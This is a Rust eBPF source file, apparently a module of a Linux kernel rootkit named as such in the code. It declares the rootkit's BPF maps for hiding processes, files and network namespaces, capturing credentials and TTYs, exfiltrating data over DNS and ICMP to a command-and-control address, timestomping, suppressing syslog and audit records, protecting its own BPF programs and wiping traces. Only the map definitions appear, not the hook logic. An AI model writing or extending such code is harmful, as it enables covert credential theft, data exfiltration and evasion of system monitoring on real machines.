use aya_ebpf::{
    macros::map,
    maps::{HashMap, PerCpuArray, RingBuf},
};
use common::{
    ContainerProbeResult, DnsExfilChunk, IcmpExfilPayload, RootkitConfig, TimestompEntry,
};

#[map]
pub(crate) static HIDDEN_PIDS: HashMap<u32, u8> = HashMap::with_max_entries(64, 0);

#[map]
pub(crate) static CONFIG: HashMap<u32, RootkitConfig> = HashMap::with_max_entries(1, 0);

#[map]
pub(crate) static EVENTS: RingBuf = RingBuf::with_byte_size(256 * 1024, 0);

#[map]
pub(crate) static GETDENTS_BUFS: HashMap<u64, u64> = HashMap::with_max_entries(1024, 0);

#[map]
pub(crate) static GETDENTS_RETS: HashMap<u64, i64> = HashMap::with_max_entries(1024, 0);

#[map]
pub(crate) static MONITORED_TTYS: HashMap<u64, u8> = HashMap::with_max_entries(128, 0);

#[map]
pub(crate) static CRED_EVENTS: RingBuf = RingBuf::with_byte_size(64 * 1024, 0);

#[map]
pub(crate) static SPOOFED_PPIDS: HashMap<u32, u32> = HashMap::with_max_entries(64, 0);

#[map]
pub(crate) static DNS_EXFIL_QUEUE: HashMap<u32, DnsExfilChunk> = HashMap::with_max_entries(64, 0);

#[map]
pub(crate) static PROTECTED_PROG_IDS: HashMap<u32, u8> = HashMap::with_max_entries(32, 0);

#[map]
pub(crate) static TIMESTOMP_INODES: HashMap<u64, TimestompEntry> = HashMap::with_max_entries(64, 0);

#[map]
pub(crate) static LOG_SUPPRESS_PATTERNS: HashMap<u64, u8> = HashMap::with_max_entries(32, 0);

#[map]
pub(crate) static OBFUSCATE_INODES: HashMap<u64, u8> = HashMap::with_max_entries(32, 0);

#[derive(Clone, Copy)]
#[repr(C)]
pub(crate) struct VfsReadCtx {
    pub buf_ptr: u64,
    pub inode: u64,
    pub count: u64,
}

#[map]
pub(crate) static VFS_READ_ARGS: HashMap<u64, VfsReadCtx> = HashMap::with_max_entries(1024, 0);

#[repr(C)]
pub(crate) struct ScratchBuf {
    pub data: [u8; 4096],
}

#[map]
pub(crate) static SCRATCH_BUF: PerCpuArray<ScratchBuf> = PerCpuArray::with_max_entries(1, 0);

#[derive(Clone, Copy)]
#[repr(C)]
pub(crate) struct SyslogCtx {
    pub syslog_type: u32,
    pub _pad: u32,
    pub buf_ptr: u64,
    pub len: u64,
}

#[map]
pub(crate) static SYSLOG_ARGS: HashMap<u64, SyslogCtx> = HashMap::with_max_entries(256, 0);

#[derive(Clone, Copy)]
#[repr(C)]
pub(crate) struct GetattrCtx {
    pub kstat_ptr: u64,
    pub inode: u64,
}

#[map]
pub(crate) static GETATTR_ARGS: HashMap<u64, GetattrCtx> = HashMap::with_max_entries(256, 0);

#[map]
pub(crate) static AUDIT_CTX_PTRS: HashMap<u64, u64> = HashMap::with_max_entries(1024, 0);

#[map]
pub(crate) static DNS_EXFIL_SEQ: HashMap<u32, u32> = HashMap::with_max_entries(1, 0);

#[map]
pub(crate) static HIDDEN_NETNS: HashMap<u64, u8> = HashMap::with_max_entries(32, 0);

#[map]
pub(crate) static OWN_PROG_IDS: HashMap<u32, u8> = HashMap::with_max_entries(64, 0);

#[derive(Clone, Copy)]
#[repr(C)]
pub(crate) struct BpfCmdCtx {
    pub cmd: u32,
    pub _pad: u32,
}

#[map]
pub(crate) static BPF_CMD_ARGS: HashMap<u64, BpfCmdCtx> = HashMap::with_max_entries(256, 0);

#[map]
pub(crate) static PROC_MODULES_INO: aya_ebpf::maps::Array<u64> =
    aya_ebpf::maps::Array::with_max_entries(1, 0);

#[map]
pub(crate) static MEMFD_TRACKER: HashMap<u32, u64> = HashMap::with_max_entries(64, 0);

#[derive(Clone, Copy)]
#[repr(C)]
pub(crate) struct MemfdCtx {
    pub flags: u32,
    pub _pad: u32,
}

#[map]
pub(crate) static MEMFD_ARGS: HashMap<u64, MemfdCtx> = HashMap::with_max_entries(256, 0);

#[map]
pub(crate) static SYSLOG_FD_INODES: HashMap<u64, u8> = HashMap::with_max_entries(32, 0);

#[map]
pub(crate) static WIPE_FLAG: aya_ebpf::maps::Array<u32> =
    aya_ebpf::maps::Array::with_max_entries(1, 0);

#[map]
pub(crate) static ICMP_EXFIL_QUEUE: HashMap<u32, IcmpExfilPayload> =
    HashMap::with_max_entries(64, 0);

#[map]
pub(crate) static ICMP_C2_ADDR: aya_ebpf::maps::Array<u32> =
    aya_ebpf::maps::Array::with_max_entries(1, 0);

#[map]
pub(crate) static ICMP_EXFIL_SEQ: HashMap<u32, u32> = HashMap::with_max_entries(1, 0);

#[map]
pub(crate) static HIJACK_TARGETS: HashMap<u64, u8> = HashMap::with_max_entries(32, 0);

#[map]
pub(crate) static CONTAINER_STATE: aya_ebpf::maps::Array<ContainerProbeResult> =
    aya_ebpf::maps::Array::with_max_entries(1, 0);
